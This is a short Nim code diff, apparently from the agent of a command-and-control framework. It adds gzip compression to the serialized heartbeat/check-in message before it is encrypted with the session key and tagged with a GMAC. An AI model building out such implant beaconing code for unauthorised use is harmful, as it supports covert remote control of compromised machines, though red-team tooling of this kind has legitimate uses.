@@ -1,5 +1,4 @@
-import times 
-
+import times, zippy
 import ../../common/[types, serialize, sequence, utils, crypto]
 
 proc createHeartbeat*(ctx: AgentCtx): Heartbeat = 
@@ -31,8 +30,11 @@ proc serializeHeartbeat*(ctx: AgentCtx, request: var Heartbeat): seq[byte] =
     let body = packer.pack()
     packer.reset()
 
+    # Compress payload body
+    let compressedPayload = compress(body, BestCompression, dfGzip)
+
     # Encrypt check-in / heartbeat request body 
-    let (encData, gmac) = encrypt(ctx.sessionKey, request.header.iv, body, request.header.seqNr)
+    let (encData, gmac) = encrypt(ctx.sessionKey, request.header.iv, compressedPayload, request.header.seqNr)
 
     # Set authentication tag (GMAC)
     request.header.gmac = gmac
